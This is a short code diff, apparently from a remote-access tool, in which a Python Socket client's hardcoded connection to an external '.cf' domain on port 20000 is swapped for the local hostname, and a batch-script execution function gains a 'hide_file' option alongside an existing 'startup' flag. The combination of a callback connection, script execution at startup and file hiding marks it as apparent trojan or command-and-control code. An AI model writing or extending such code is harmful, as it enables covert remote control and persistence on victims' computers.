@@ -13,7 +13,7 @@ class Socket:
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect(("uhblajkil.cf", 20000))
+            self.active_socket.connect((socket.gethostname(), 20000))
             Socket.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
@@ -52,7 +52,7 @@ class Socket:
             self.established = False
 
 
-def execute_batch_script(script, startup=False):
+def execute_batch_script(script, startup=False, hide_file=False):
     if not script:
         return False
     script = script.replace("/n", "\n")
